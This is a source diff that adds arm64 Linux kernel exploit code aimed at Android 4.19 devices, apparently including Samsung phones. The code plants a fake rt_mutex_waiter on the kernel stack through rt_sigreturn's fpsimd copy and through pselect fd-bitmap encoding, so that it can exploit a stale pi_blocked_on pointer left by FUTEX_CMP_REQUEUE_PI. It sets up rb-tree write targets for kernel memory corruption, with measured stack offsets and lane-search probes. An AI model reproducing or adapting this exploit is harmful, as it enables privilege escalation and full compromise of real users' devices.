@@ -9,6 +9,276 @@
 #define SLIDE_PSELECT_TIMEOUT_USEC 200000
 #define SLIDE_WAIT_SECONDS 5
 
+/* ---------------- deterministic stale-waiter plant ----------------
+ *
+ * The FUTEX_CMP_REQUEUE_PI rollback in remove_waiter() clears
+ * current->pi_blocked_on instead of waiter->task's, so the victim returns
+ * to userspace with pi_blocked_on still pointing at the rt_mutex_waiter
+ * that lived in do_futex()'s kernel-stack frame.
+ *
+ * pselect cannot rebuild that object: core_sys_select() zeroes the whole
+ * result region and do_select() early-breaks after the first ready bitmap
+ * word, so only waiter.word0 is ever shaped and waiter->lock is never
+ * written at all.
+ *
+ * The delivery primitive is rt_sigreturn: restore_fpsimd_context() copies
+ * 0x200 bytes of user fpsimd state to entry_sp-0x280, so the window covers
+ * [entry_sp-0x280, entry_sp-0x80).  The stale waiter on this build is at
+ * entry_sp-0x270 (measured: waiter->prio is lane 10, so the base is lane 2),
+ * which sits entirely inside that window.  The copy is verbatim and
+ * unconditional.  adjtimex() only reaches entry_sp-0x1e8 and can never plant
+ * this waiter.
+ *
+ * After plant_waiter() returns this thread must not enter the kernel until
+ * the punch has completed: any syscall reuses that stack region.
+ */
+#ifdef SIGRET_WAITER_LANE
+
+#ifndef SYS_tgkill
+#define SYS_tgkill 131
+#endif
+#ifndef SYS_nanosleep
+#define SYS_nanosleep 101
+#endif
+
+#define PLANT_LANES 64
+
+/* Heap-free, stack-free payload: the fpsimd copy reads this
+ * through a pointer, so keeping it static removes 512 bytes
+ * from every caller's frame and keeps the plant window high. */
+static uint64_t plant_vals[PLANT_LANES];
+int plant_pad_current;
+atomic_int plant_ready;
+
+/* Post-sigreturn readback of the FP registers.  rt_sigreturn copies the 512
+ * bytes of fpsimd_context into a kernel-stack local and then loads that local
+ * into the FPU, so a match here proves the kernel local holds our bytes. */
+uint64_t plant_fp_readback[8];
+int plant_fp_mismatch = -1;
+
+int plant_signal_tid;
+int plant_pid;
+volatile sig_atomic_t plant_hits;
+int plant_delivery_failed;
+
+/* Delivery evidence, read by the punch thread: this thread cannot log after
+ * the plant without a syscall, which would reuse the planted stack region. */
+long plant_adjtimex_ret = -1;
+long plant_adjtimex_errno = -1;
+
+static void plant_handler(int sig) {
+  (void)sig;
+  plant_hits++;
+}
+
+int plant_waiter_install(void) {
+  struct sigaction sa;
+  memset(&sa, 0, sizeof(sa));
+  sa.sa_handler = plant_handler;
+  sigemptyset(&sa.sa_mask);
+  sa.sa_flags = SA_RESTART;
+  if (sigaction(PLANT_SIGNAL, &sa, NULL) != 0) {
+    return 0;
+  }
+  plant_signal_tid = (int)syscall(SYS_gettid);
+  plant_pid = (int)syscall(SYS_getpid);
+  return 1;
+}
+
+/* Load q0..q31 from vals and take PLANT_SIGNAL in the same instruction
+ * stream: the kernel snapshots the current fpsimd state when it builds the
+ * signal frame, so no compiler-generated code can run between the load and
+ * the svc.  q8..q15 are callee-saved, hence the explicit clobbers. */
+static void plant_copy(const uint64_t *vals) {
+  register long x0 __asm__("x0") = (long)plant_pid;
+  register long x1 __asm__("x1") = (long)plant_signal_tid;
+  register long x2 __asm__("x2") = (long)PLANT_SIGNAL;
+  register long x8 __asm__("x8") = (long)SYS_tgkill;
+  __asm__ __volatile__(
+      "ldp q0,  q1,  [%[p], #0]\n\t"
+      "ldp q2,  q3,  [%[p], #32]\n\t"
+      "ldp q4,  q5,  [%[p], #64]\n\t"
+      "ldp q6,  q7,  [%[p], #96]\n\t"
+      "ldp q8,  q9,  [%[p], #128]\n\t"
+      "ldp q10, q11, [%[p], #160]\n\t"
+      "ldp q12, q13, [%[p], #192]\n\t"
+      "ldp q14, q15, [%[p], #224]\n\t"
+      "ldp q16, q17, [%[p], #256]\n\t"
+      "ldp q18, q19, [%[p], #288]\n\t"
+      "ldp q20, q21, [%[p], #320]\n\t"
+      "ldp q22, q23, [%[p], #352]\n\t"
+      "ldp q24, q25, [%[p], #384]\n\t"
+      "ldp q26, q27, [%[p], #416]\n\t"
+      "ldp q28, q29, [%[p], #448]\n\t"
+      "ldp q30, q31, [%[p], #480]\n\t"
+      "svc #0\n\t"
+      : "+r"(x0)
+      : [p] "r"(vals), "r"(x1), "r"(x2), "r"(x8)
+      : "x3", "x4", "x5", "x6", "x7", "x9", "x10", "x11", "x12", "x13",
+        "x14", "x15", "x16", "x17",
+        "v0", "v1", "v2", "v3", "v4", "v5", "v6", "v7",
+        "v8", "v9", "v10", "v11", "v12", "v13", "v14", "v15",
+        "v16", "v17", "v18", "v19", "v20", "v21", "v22", "v23",
+        "v24", "v25", "v26", "v27", "v28", "v29", "v30", "v31",
+        "memory");
+  /* x0 holds the tgkill result; the signal has already been delivered and
+   * rt_sigreturn has already performed the 0x200-byte copy. */
+  plant_adjtimex_ret = x0;
+  plant_adjtimex_errno = 0;
+  plant_delivery_failed = (x0 != 0);
+  /* q0..q7 are caller-saved, so they still hold what sigreturn loaded. */
+  /* Exactly 64 bytes: the four-pair form wrote 128 and zeroed the globals
+   * that follow this array (plant_hits, plant_delivery_failed). */
+  __asm__ __volatile__(
+      "stp q0, q1, [%0]\n\t"
+      "stp q2, q3, [%0, #32]\n\t"
+      :
+      : "r"(plant_fp_readback)
+      : "memory");
+  plant_fp_mismatch = 0;
+  for (int k = 0; k < 8; k++) {
+    if (plant_fp_readback[k] != vals[k]) {
+      plant_fp_mismatch = k + 1;
+      break;
+    }
+  }
+}
+
+/* Diagnostic: fill the entire 512-byte fpsimd plant region with one value.
+ * Every lane then reads back as that pointer, so waiter->lock resolves to it
+ * regardless of where the kernel's stale pi_blocked_on actually points. */
+void plant_waiter_all(uint64_t value) {
+  uint64_t *vals = plant_vals;
+  for (int i = 0; i < PLANT_LANES; i++) {
+    vals[i] = value;
+  }
+  plant_copy(vals);
+}
+
+int plant_shallow_done;
+
+/* Plant from the futex caller's frame.  KS_PLANT_ALL fills every lane with
+ * fake_lock so the walk reads our lock at ANY alignment. */
+void plant_shallow(void) {
+  const char *all = getenv("KS_PLANT_ALL");
+  const char *one = getenv("KS_PLANT_SHALLOW");
+  if (!all && !one) {
+    return;
+  }
+  uint64_t value = one ? strtoull(one, NULL, 0)
+                       : (getenv("KS_PLANT_PAGE_BASE")
+                              ? (uint64_t)(fake_lock - LOCK_OFF)
+                              : (uint64_t)fake_lock);
+
+  const char *carpet = getenv("KS_PLANT_CARPET");
+  if (carpet && *carpet) {
+    /* Cover [0, carpet) below SP in 512-byte steps: one device cycle instead of
+     * one per position.  Bytes below SP are dead stack, so earlier writes are
+     * only clobbered by the syscalls we deliberately make. */
+    int span = atoi(carpet);
+    if (span < 512) span = 512;
+    for (int off = 0; off < span; off += 512) {
+      plant_pad_current = off;
+      plant_waiter_all(value);
+    }
+    plant_pad_current = 0;
+    pr_info("KS_PLANT_CARPET span=%d value=%016llx steps=%d\n", span,
+            (unsigned long long)value, span / 512);
+    plant_shallow_done = 1;
+    return;
+  }
+  plant_pad_current = getenv("KS_PLANT_PAD") ? atoi(getenv("KS_PLANT_PAD")) : 0;
+  pr_info("KS_PLANT_SHALLOW value=%016llx lane_all=%d pad=%s\n",
+          (unsigned long long)value, all ? 1 : 0,
+          getenv("KS_PLANT_PAD") ? getenv("KS_PLANT_PAD") : "0");
+  if (all) {
+    /* Full fake waiter at the measured base-30 lane: tree_entry is a
+     * terminal node, pi_tree_entry carries the fops write triple, the lock
+     * is fake_lock and the prio is deliberately unequal to p->prio so the
+     * chain actually walks instead of early-returning. */
+    int vprio = victim_effective_prio((int)syscall(SYS_gettid));
+    pr_info("KS_PLANT_LANES base30=%d lock30=%d prio30=%d prio=%d "
+            "victim_prio=%d pc=%016zx right=%016zx left=%016zx\n",
+            (int)SIGRET_WAITER_LANE, (int)SIGRET_WAITER_LANE + 7,
+            (int)SIGRET_WAITER_LANE + 8, FAKE_WAITER_PRIO, vprio,
+            (size_t)fake_parent, (size_t)fake_right, (size_t)fake_left);
+    plant_waiter_fake(fake_task, fake_lock, FAKE_WAITER_PRIO, fake_parent,
+                      fake_right, fake_left);
+  } else {
+    plant_waiter_all(value);
+  }
+  plant_shallow_done = 1;
+}
+
+/* Full fake waiter: the pi_tree_entry triple carries the rb_erase/rb_insert
+ * write targets, exactly like the skb/pselect payload's fake_w0.  tree_entry
+ * stays a terminal node so the dequeue from the fake lock is a no-op. */
+void plant_waiter_fake(uint64_t task, uint64_t lock, int prio, uint64_t pc,
+                       uint64_t right, uint64_t left) {
+  uint64_t *vals = plant_vals;
+  memset(vals, 0, sizeof(plant_vals));
+
+  const int base = (int)SIGRET_WAITER_LANE;
+  vals[base + 0] = 1;   /* tree_entry.__rb_parent_color: terminal */
+  vals[base + 1] = 0;   /* tree_entry.rb_right */
+  vals[base + 2] = 0;   /* tree_entry.rb_left */
+  vals[base + 3] = pc;  /* pi_tree_entry.__rb_parent_color -> write target */
+  vals[base + 4] = right;
+  vals[base + 5] = left;
+  vals[base + 6] = task;
+  vals[base + 7] = lock;
+  vals[base + 8] = (uint64_t)(uint32_t)prio;
+  vals[base + 9] = 0;
+  plant_copy(vals);
+}
+
+void plant_waiter(uint64_t task, uint64_t lock, int prio) {
+  uint64_t *vals = plant_vals;
+  memset(vals, 0, sizeof(plant_vals));
+
+  const int base = (int)SIGRET_WAITER_LANE;
+  vals[base + 0] = 1;   /* tree_entry.__rb_parent_color: terminal, RB_BLACK */
+  vals[base + 1] = 0;   /* tree_entry.rb_right */
+  vals[base + 2] = 0;   /* tree_entry.rb_left */
+  vals[base + 3] = 1;   /* pi_tree_entry.__rb_parent_color */
+  vals[base + 4] = 0;   /* pi_tree_entry.rb_right */
+  vals[base + 5] = 0;   /* pi_tree_entry.rb_left */
+  vals[base + 6] = task;                        /* 0x30 task */
+  vals[base + 7] = lock;                        /* 0x38 lock */
+  vals[base + 8] = (uint64_t)(uint32_t)prio;    /* 0x40 prio */
+  vals[base + 9] = 0;                           /* 0x48 deadline */
+  plant_copy(vals);
+}
+
+/* Every qword carries the same priority.  rt_mutex_adjust_pi() then exits at
+ * its equal-priority check no matter which lane actually overlays the stale
+ * waiter, which turns "does the plant cover the waiter at all?" into a test
+ * that cannot dereference a wild lock. */
+void plant_waiter_uniform(uint32_t prio) {
+  uint64_t *vals = plant_vals;
+  for (int i = 0; i < PLANT_LANES; i++) {
+    vals[i] = (uint64_t)prio;
+  }
+  plant_copy(vals);
+}
+
+/* Lane search: every qword carries the equal priority except [lo, hi), which
+ * is zeroed.  rt_mutex_adjust_pi() compares prio before it ever reads
+ * waiter->lock, so the punch panics only when the waiter's prio qword falls in
+ * the zeroed window.  That turns an address question into a binary search. */
+void plant_waiter_zero_range(uint32_t prio, int lo, int hi) {
+  uint64_t *vals = plant_vals;
+  for (int i = 0; i < PLANT_LANES; i++) {
+    vals[i] = (uint64_t)prio;
+  }
+  for (int i = lo; i < hi && i < PLANT_LANES; i++) {
+    vals[i] = 0;
+  }
+  plant_copy(vals);
+}
+
+#endif /* SIGRET_WAITER_LANE */
+
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
 static uint32_t slide_f_pi_chain;
@@ -31,7 +301,7 @@ static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
 static atomic_int slide_consume_inflight;
 
-static int slide_pselect_waiter_shift(void) {
+int slide_pselect_waiter_shift(void) {
   const char *s = getenv("GHOSTLOCK_SLIDE_SHIFT");
   return s && *s ? atoi(s) : PSELECT_WAITER_WORD_SHIFT;
 }
@@ -104,10 +374,11 @@ void slide_pselect_put_waiter_word(
   }
 }
 
-/* alioth 4.19 pselect6 fd-bitmap (disassembly-verified 2026-09-13):
+/* 4.19 pselect6 fd-bitmap (alioth 2026-09-13, Samsung 2026-10-30):
  * stack_fds at T-0x210 (core_sys_select add x19,sp,#0x50 under the
- * 0xa0+0x1c0 pselect chain), stale rt_waiter at T-0x198 (do_futex
- * sub x2,x29,#0xc8 -> rt_mutex_wait_proxy_lock, x29 = T-0x70-0x60).
+ * 0xa0+0x1c0 pselect chain).  On Samsung the requeue path is inlined into
+ * do_futex (0x1e0 frame); rt_mutex_init_waiter(&rt_waiter) takes sp+0xc0
+ * there, so the waiter is at T-0x70-0x1e0+0xc0 = T-0x190.
  * 4.19 core_sys_select lays out six size=40 regions:
  *   in[0,40) out[40,80) ex[80,120) res_in[120,160) res_out[160,200)
  * so the stale waiter bytes 0-39 = res_in and bytes 40-79 = res_out:
@@ -130,36 +401,183 @@ void slide_pselect_put_waiter_word(
 /* waiter qwords encoded into res_in (bytes 0-39) / res_out (bytes 40-79) */
 static uint64_t slide_waiter_in_words[5];
 static uint64_t slide_waiter_out_words[5];
-void prepare_slide_select_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
+/* Encode a complete struct rt_mutex_waiter (0x50 bytes: see
+ * WAITER_*_OFF / FAKE_WAITER_*_OFF) into the pselect readiness bitmap so
+ * that its first byte lands on the stale waiter, not 8 bytes below it.
+ *
+ * The kernel copies `in` to res_in and `out` to res_out and then stores
+ * res_in[i] = in[i] & read_ready(i), res_out[i] = out[i] & write_ready(i).
+ * open_slide_selected_fds() gives every fd exactly the readiness its bits
+ * ask for, so the result reproduces the encoded words byte for byte.
+ * slide_pselect_put_waiter_word() applies PSELECT_WAITER_WORD_SHIFT, which
+ * is what moves word 0 from res_in+0 (T-0x198) to res_in+8 (T-0x190). */
+static void encode_waiter_fdsets(
+    fd_set *in, fd_set *out, fd_set *ex, uint64_t task, uint64_t lock,
+    int punch) {
+  static const char *names[10] = {
+    "tree_entry.parent_color", "tree_entry.rb_right", "tree_entry.rb_left",
+    "pi_tree.parent_color", "pi_tree.rb_right", "pi_tree.rb_left",
+    "task", "lock", "prio", "deadline"};
+  /* The tree parents are the store primitive, not decoration: the PI walk's
+   * rt_mutex_dequeue()/rt_mutex_dequeue_pi() call __rb_erase_augmented() on
+   * these nodes, and that writes through __rb_parent_color into
+   * `parent->rb_left/rb_right`.  A terminal node (1) therefore performs no
+   * store at all, which is why the punch never wrote a byte.  The punch route
+   * points both parents at fake_w0 so the first erase lands inside the
+   * controlled page and its effect is visible in the SKB diff. */
+  const uint64_t tree_parent = punch ? (uint64_t)fake_w0 : 1;
+  /* The working Samsung 4.19 target leaves pi_tree.parent_color at 0; only
+   * tree_entry.parent_color carries the page pointer.  Pointing both at
+   * fake_w0 made the walk spin with IRQs off until the hardware watchdog
+   * reset the phone. */
+  const uint64_t pi_tree_parent = 0;
+  const uint64_t words[10] = {
+    tree_parent, 0, 0,                /* tree_entry */
+    pi_tree_parent, 0, 0,             /* pi_tree_entry */
+    task,                             /* 0x30 task */
+    lock,                             /* 0x38 lock */
+    (uint64_t)FAKE_WAITER_PRIO,       /* 0x40 prio */
+    0,                                /* 0x48 deadline */
+  };
+  int words_per_set = slide_pselect_words_per_set();
+
   FD_ZERO(in);
   FD_ZERO(out);
   FD_ZERO(ex);
-
-  /* waiter bytes 0-39 (res_in): tree_entry(pc,right,left) +
-   * pi_tree_entry(pc,right), all terminal. */
-  slide_waiter_in_words[0] = 1;  /* tree_entry.__rb_parent_color */
-  slide_waiter_in_words[1] = 0;  /* tree_entry.rb_right */
-  slide_waiter_in_words[2] = 0;  /* tree_entry.rb_left */
-  slide_waiter_in_words[3] = 1;  /* pi_tree_entry.__rb_parent_color */
-  slide_waiter_in_words[4] = 0;  /* pi_tree_entry.rb_right */
-
-  /* waiter bytes 40-79 (res_out): pi_tree_entry.rb_left, task, lock,
-   * prio, deadline. */
-  slide_waiter_out_words[0] = 0;                       /* pi_tree.rb_left */
-  slide_waiter_out_words[1] = SLIDE_INIT_TASK;         /* task */
-  slide_waiter_out_words[2] = fake_lock;               /* lock */
-  slide_waiter_out_words[3] = (uint64_t)FAKE_WAITER_PRIO; /* prio */
-  slide_waiter_out_words[4] = 0;                       /* deadline */
-
-  /* The input masks gate which res bits do_select may set.  The stale
-   * waiter is built from the OUTPUT buffers (res_in/res_out), so the
-   * res_in mask must stay exactly equal to the waiter's tree qwords:
-   * folding res_out bits into res_in would corrupt the rb fields with
-   * readiness bits for fds that only need write readiness. */
-  for (int w = 0; w < 5; w++) {
-    fdset_put_word(in, w, slide_waiter_in_words[w]);
-    fdset_put_word(out, w, slide_waiter_out_words[w]);
+  for (int w = 0; w < 10; w++) {
+    slide_pselect_put_waiter_word(
+        in, out, ex, words_per_set, w, words[w], names[w]);
   }
+
+  for (int w = 0; w < 5; w++) {
+    slide_waiter_in_words[w] = slide_pselect_get_global_word(
+        in, out, ex, words_per_set, w);
+    slide_waiter_out_words[w] = slide_pselect_get_global_word(
+        in, out, ex, words_per_set, 5 + w);
+  }
+}
+
+
+/* Coverage probe: every result word carries the same pointer, so whichever
+ * 8-byte boundary inside the fd-set window the stale waiter starts at, its
+ * lock field reads that pointer. */
+static void encode_lock_cover(fd_set *in, fd_set *out, fd_set *ex,
+                              uint64_t value) {
+  static const char *names[10] = {
+    "cover0", "cover1", "cover2", "cover3", "cover4",
+    "cover5", "cover6", "cover7", "cover8", "cover9"};
+  int words_per_set = slide_pselect_words_per_set();
+  FD_ZERO(in);
+  FD_ZERO(out);
+  FD_ZERO(ex);
+  for (int w = 0; w < 10; w++) {
+    slide_pselect_put_waiter_word(in, out, ex, words_per_set, w, value,
+                                  names[w]);
+  }
+}
+
+void prepare_slide_select_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
+  /* Slide/leak route: the walk must follow the real init_task so the
+   * prio copy lands in a live task_struct. */
+  encode_waiter_fdsets(in, out, ex, SLIDE_INIT_TASK, fake_lock, 0);
+}
+
+
+/* --- pselect from the futex call depth ----------------------------------
+ * All state is global so this frame stays a few words.  With SP within ~0x20
+ * of the futex svc, core_sys_select's buffer at SP-0x210..SP-0x120 covers the
+ * stale waiter at futex_sp-0x190. */
+static fd_set depth_in, depth_out, depth_ex;
+static struct timespec depth_timeout;
+static int depth_high_read = -1;
+
+int plant_fdset_at_futex_depth(void) {
+  if (depth_high_read < 0) {
+    int p[2];
+    if (pipe(p) == 0) {
+      depth_high_read = fcntl(p[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
+      close(p[0]);
+      close(p[1]);
+    }
+    if (depth_high_read < 0) {
+      depth_high_read = 0;
+    }
+  }
+  prepare_punch_select_fdsets(&depth_in, &depth_out, &depth_ex);
+  open_slide_selected_fds(&depth_in, &depth_out, &depth_ex, depth_high_read);
+  const char *carpet = getenv("KS_SELECT_CARPET");
+  if (carpet && *carpet) {
+    int span = atoi(carpet);
+    for (int off = 0; off <= span; off += 128) {
+      int n = off < 32 ? 32 : off;
+      volatile char pad[n];
+      for (int i = 0; i < n; i += 64) {
+        pad[i] = 0;
+      }
+      __asm__ volatile("" :: "r"(pad) : "memory");
+      depth_timeout.tv_sec = 0;
+      depth_timeout.tv_nsec = 100000;
+      pselect(PSELECT_ROUTE_NFDS, &depth_in, &depth_out, &depth_ex,
+              &depth_timeout, NULL);
+    }
+    pr_info("KS_SELECT_CARPET span=%d steps=%d\n", span, span / 128 + 1);
+  }
+  atomic_store(&consumer_calls, 0);
+  atomic_store(&consumer_success, 0);
+  atomic_store(&punch_consume_stop, 0);
+  atomic_store(&main_route_delay_usec, 0);
+  atomic_store(&plant_ready, 1);
+  atomic_store(&punch_consume_go, 1);
+  depth_timeout.tv_sec = 3;
+  depth_timeout.tv_nsec = 0;
+  int r = pselect(PSELECT_ROUTE_NFDS, &depth_in, &depth_out, &depth_ex,
+                  &depth_timeout, NULL);
+  int e = errno;
+  atomic_store(&punch_consume_go, 0);
+  pr_info("inline pselect ret=%d errno=%d calls=%d success=%d\n", r, e,
+          atomic_load(&consumer_calls), atomic_load(&consumer_success));
+  return r;
+}
+
+void prepare_punch_select_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
+  if (getenv("KS_SELECT_RAW_FILL")) {
+    /* The stale waiter aliases the input bitmap copy at offset ~0x30-0x50.
+     * Literal 8-byte pattern, no readiness encoding needed. */
+    unsigned char *b[3];
+    b[0] = (unsigned char *)in;
+    b[1] = (unsigned char *)out;
+    b[2] = (unsigned char *)ex;
+    unsigned char pat[8];
+    uint64_t v = (uint64_t)fake_lock;
+    if (getenv("KS_SELECT_RAW_TEXT")) {
+      /* Known-mapped kernel text alias: proves whether the walk reads this
+       * window at all, independent of the sprayed page. */
+      v = (uint64_t)data_addr(KIMAGE_TEXT_BASE);
+    }
+    for (int k = 0; k < 8; k++) pat[k] = (unsigned char)(v >> (8 * k));
+    for (int s_i = 0; s_i < 3; s_i++) {
+      FD_ZERO((fd_set *)b[s_i]);
+      for (int j = 0; j < 40; j++) b[s_i][j] = pat[j & 7];
+    }
+    pr_info("KS_SELECT_RAW_FILL lock=%016zx\n", (size_t)fake_lock);
+    return;
+  }
+  if (getenv("KS_PSELECT_FILL")) {
+    pr_info("KS_PSELECT_FILL lock=%016zx\\n", (size_t)fake_lock);
+    encode_lock_cover(in, out, ex, (uint64_t)fake_lock);
+    return;
+  }
+  /* Punch route: task/lock must point into the controlled page so the
+   * walk reads fake_w0 via fake_task->pi_blocked_on. */
+  /* Match the validated Samsung 4.19 port exactly: the shaped waiter keeps
+   * the real init_task in the task slot.  A fake task_struct here changes
+   * which lock the chain takes next and was never what that port used. */
+  /* KS_SENTINEL_LOCK: plant a mapped lock whose +0x18 is zero, so the walk
+   * takes the no-waiters branch and cannot reach +0x304.  Tests whether
+   * the stack plant reaches the chain at all. */
+  encode_waiter_fdsets(in, out, ex, SLIDE_INIT_TASK,
+                       getenv("KS_SENTINEL_LOCK") && fake_task
+                           ? fake_task : fake_lock, 1);
 }
 
 void fdset_put_bitmap_value(fd_set *set, int word, uint64_t value) {
@@ -178,6 +596,13 @@ void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
   int null_fd = (int)syscall(SYS_openat, AT_FDCWD, "/dev/null", O_RDWR, 0);
   int pipe_fds[2] = {-1, -1};
   zero_fd = (int)syscall(SYS_openat, AT_FDCWD, "/dev/zero", O_RDONLY, 0);
+  /* The sweep below dup2()s over fds 0..NFDS-1, which includes the
+   * template fds themselves.  If a template stayed below NFDS the sweep
+   * would replace it and every later dup2(template, fd) would install
+   * the wrong readiness type, silently corrupting the encoded pointer
+   * words.  Move both templates (and close the low copies) first. */
+  ks_relocate_fd_min(&null_fd, KS_FD_PROTECT_MIN);
+  ks_relocate_fd_min(&zero_fd, KS_FD_PROTECT_MIN);
   if (syscall(SYS_pipe2, pipe_fds, 0) == 0) {
     /* Keep the write end alive above NFDS so the blocked read end never
      * sees POLLHUP, and keep a write-end template for (0,1) fds. */
@@ -539,7 +964,7 @@ static uint32_t h1a_w_f_pi_chain;
 #define H1A_W_WATCHDOG_TIMEOUT_MS 60000
 #define H1A_W_PSELECT_TIMEOUT_SEC 10
 #define H1A_W_STACK_FDS_OFFSET 0x210
-#define H1A_W_STALE_WAITER_OFFSET 0x198
+#define H1A_W_STALE_WAITER_OFFSET 0x190
 #define H1A_W_NT_PRSTATUS 1
 #ifndef PTRACE_SEIZE
 #define PTRACE_SEIZE 0x4206
